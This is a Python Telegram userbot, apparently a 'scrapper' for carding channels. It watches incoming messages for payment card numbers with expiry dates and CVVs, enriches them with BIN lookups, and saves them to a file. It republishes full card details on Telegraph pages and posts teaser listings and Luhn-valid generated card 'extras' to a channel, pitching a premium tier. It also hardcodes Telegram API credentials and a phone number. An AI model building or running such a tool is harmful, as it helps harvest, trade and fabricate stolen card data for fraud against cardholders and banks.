import requests
from telethon.sync import TelegramClient, events
from telegraph import Telegraph
from telethon.errors import FloodWaitError
import asyncio
from datetime import datetime
import random
import re
import os

# Detalles de la API de Telegram
Canal = -1002171584701
id_api = "20986098"
api_hash = "a3dcc1132ce50197ac1351ff56cd126e"
phone_number = "+51904749277"

# Inicializar Telegraph
telegraph = Telegraph()
telegraph.create_account(short_name='FreeScrapp')

# Ruta de la imagen .jpg
imagen_path = "ebe19c7a8c0fc296775c3fed44a312b7.jpg" 

# Función para escribir en archivo .txt con codificación UTF-8
def write_to_file(cc, extras):
    with open("cards_info.txt", "a", encoding="utf-8") as file:
        file.write(f"{cc}\n")
        for extra in extras:
            file.write(f"{extra}\n")

# Función para encontrar información de tarjeta usando regex
def find_cards(text):
    try:
        card_info = re.search(r'(\b\d{16}\b)[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\b\d{3,4}\b)', text)
        if card_info:
            cc, mes, ano, cvv = card_info.groups()
            return f'{cc}|{mes}|{ano}|{cvv}'
        else:
            return None
    except Exception:
        return None

# Algoritmo de Luhn para verificar números de tarjeta
def luhn_check(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    return (sum(odd_digits) + sum(sum(digits_of(d * 2)) for d in even_digits)) % 10 == 0

# Generar números de tarjeta válidos
def generate_valid_cc(base_cc):
    while True:
        new_cc = base_cc + ''.join(str(random.randint(0, 9)) for _ in range(8))
        if luhn_check(new_cc):
            return new_cc

# Generar información adicional para la tarjeta
def generate_extra_info(cc):
    extras = []
    base_cc = cc[:12]  # Tomamos los primeros 12 dígitos de la tarjeta original
    unique_numbers = set()

    # Primera extra: tarjeta real con los últimos 4 dígitos en 'xxxx'
    exp_month = str(random.randint(1, 12)).zfill(2)
    exp_year = str(datetime.now().year + random.randint(1, 5)).zfill(2)
    first_extra = f"{base_cc}xxxx|{exp_month}|{exp_year}|rnd"
    extras.append(first_extra)
    unique_numbers.add(first_extra)

    # Generar el resto de las extras aleatoriamente
    while len(extras) < 2:
        random_digits = ''.join(str(random.randint(0, 9)) for _ in range(4))
        masked_cc = f"{base_cc[:8]}{random_digits}xxxx"
        if masked_cc not in unique_numbers:
            unique_numbers.add(masked_cc)
            exp_month = str(random.randint(1, 12)).zfill(2)
            exp_year = str(datetime.now().year + random.randint(1, 5)).zfill(2)
            extra = f"{masked_cc}|{exp_month}|{exp_year}|rnd"
            extras.append(extra)

    return extras


# Crear una página en Telegraph con la información de la tarjeta
def create_telegraph_page(cc, mes, ano, cvv, bank, brand, country, flag, level):
    title = f"Información de Tarjeta - {cc[:6]}xxxx"
    content = f"""
    <b>Tarjeta:</b> <code>{cc}|{mes}|{ano}|{cvv}</code><br>
    <b>Banco:</b> {bank}<br>
    <b>Marca:</b> {brand}<br>
    <b>País:</b> {country} {flag}<br>
    <b>Nivel:</b> {level}<br>
    """
    response = telegraph.create_page(
        title=title,
        html_content=content
    )
    return f"https://telegra.ph/{response['path']}"

# Función para mantener la conexión y reconectar en caso de desconexión
async def run_bot(client):
    @client.on(events.NewMessage)
    async def handler(event):
        ccs = find_cards(event.message.message.upper())
        if ccs:
            try:
                cc, mes, ano, cvv = ccs.split('|')
                bin = cc[:6]
                bin_info = requests.get(f"https://bins.antipublic.cc/bins/{bin}").json()
                brand = bin_info.get('brand', 'Desconocido')
                country = bin_info.get('country_name', 'Desconocido')
                flag = bin_info.get('country_flag', '')
                bank = bin_info.get('bank', 'Desconocido')
                level = bin_info.get('level', 'Desconocido')
                now = datetime.now()
                current_time = now.strftime("%Y-%m-%d %H:%M:%S")
                extras = generate_extra_info(cc)
                telegraph_url = create_telegraph_page(cc, mes, ano, cvv, bank, brand, country, flag, level)
                formatted_extras = "\n".join([f"<code>{extra}</code>" for extra in extras])
                text = f"""<b>
𝗡𝗲𝘅𝗼 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿 ㄌ
━━━━━━━━━⁐━━━━━━━━━
- 𝗧𝗮𝗿𝗷𝗲𝘁𝗮: <a href="http://t.me/xJeiber">HIDDEN INFO, BUY PREMIUM</a>
- 𝗕𝗮𝗻𝗰𝗼: {bank}
- 𝗧𝗶𝗽𝗼: {brand}
- 𝗣𝗮í𝘀: {country} {flag}
- 𝗡𝗶𝘃𝗲𝗹: {level}
━━━━━━━━━⁐━━━━━━━━━
       𝗘𝘅𝘁𝗿𝗮𝘀: 
{formatted_extras}
</b>
                """
                
                await asyncio.sleep(2)

                # Enviar imagen y mensaje con manejo de errores
                try:
                    await client.send_file(Canal, imagen_path, caption=text, parse_mode='html')
                    print("Imagen enviada exitosamente.")
                except Exception as e:
                    print(f"Error al enviar la imagen: {e}")

                write_to_file(cc, extras)
            except Exception:
                pass

async def main():
    while True:
        try:
            client = TelegramClient('FreeScrapp', id_api, api_hash)
            await client.start(phone_number)
            await run_bot(client)
            await client.run_until_disconnected()
        except (ConnectionError, Exception) as e:
            print(f"Error: {e}. Reintentando en 5 segundos...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
